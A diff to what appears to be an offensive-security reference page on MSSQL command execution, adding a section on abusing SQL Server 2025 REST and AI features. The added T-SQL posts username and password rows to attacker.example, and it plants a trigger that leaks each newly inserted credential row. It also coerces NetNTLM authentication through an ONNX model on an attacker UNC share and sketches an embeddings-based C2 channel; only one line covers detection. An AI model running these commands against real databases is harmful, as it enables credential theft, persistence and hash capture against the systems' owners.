@@ -4,8 +4,8 @@ type: technique
 tags: [database, exploitation, mssql, rce, reference-import, windows]
 phase: exploitation
 date_created: 2026-05-13
-date_updated: 2026-07-02
-sources: [InternalAllTheThings]
+date_updated: 2026-07-14
+sources: [InternalAllTheThings, hacktricks-network]
 ---
 
 # MSSQL - Command Execution
@@ -343,6 +343,41 @@ GO
 
 - [Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)
 - [MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016](https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution)
+
+## SQL Server 2025 AI and REST feature abuse (exfil, coercion, C2)
+
+SQL Server 2025 adds database-native outbound HTTPS and external embedding models. With
+sysadmin (ALTER SETTINGS) plus EXECUTE ANY EXTERNAL ENDPOINT you get exfiltration
+straight from the engine process (quieter than xp_cmdshell plus PowerShell), a fresh
+NetNTLM coercion gadget via ONNX UNC paths, and an embeddings-shaped C2 channel.
+
+```sql
+-- HTTPS exfiltration straight from the DB engine (payloads up to ~100 MB)
+EXEC sp_configure 'external rest endpoint enabled',1; RECONFIGURE WITH OVERRIDE;
+DECLARE @p NVARCHAR(MAX)=(SELECT username,password FROM dbo.app_users FOR JSON AUTO);
+EXEC sp_invoke_external_rest_endpoint
+     @url=N'https://attacker.example/collect', @method='POST', @payload=@p;
+
+-- Database-resident persistence: exfil new rows on every insert
+CREATE TRIGGER tr_exfil ON dbo.app_users AFTER INSERT AS
+  DECLARE @p NVARCHAR(MAX)=(SELECT username,password FROM inserted FOR JSON AUTO);
+  EXEC sp_invoke_external_rest_endpoint
+       @url=N'https://attacker.example/collect', @method='POST', @payload=@p;
+
+-- NetNTLM coercion via an ONNX external model pointing at an attacker UNC share
+EXEC sp_configure 'external AI runtimes enabled',1; RECONFIGURE;
+ALTER DATABASE SCOPED CONFIGURATION SET PREVIEW_FEATURES = ON;
+CREATE EXTERNAL MODEL onnx_unc WITH (
+  LOCATION=N'\\attacker\share', LOCAL_RUNTIME_PATH=N'\\attacker\share',
+  API_FORMAT='ONNX Runtime', MODEL_TYPE=EMBEDDINGS, MODEL='test');
+SELECT AI_GENERATE_EMBEDDINGS(N'test' USE MODEL onnx_unc);  -- fires SMB auth to attacker
+```
+
+For C2, stand up an OpenAI-compatible embeddings endpoint; a T-SQL loop calls
+AI_GENERATE_EMBEDDINGS(N'checkin' USE MODEL <m>), parses tasking with OPENJSON, runs
+commands via xp_cmdshell or CLR, and returns output in the next embedding request.
+Detection: alert on CREATE/ALTER/DROP EXTERNAL MODEL and enablement of the
+external-rest-endpoint / external-AI-runtimes settings (sys.external_models).
 
 ## Bypasses and variants
 
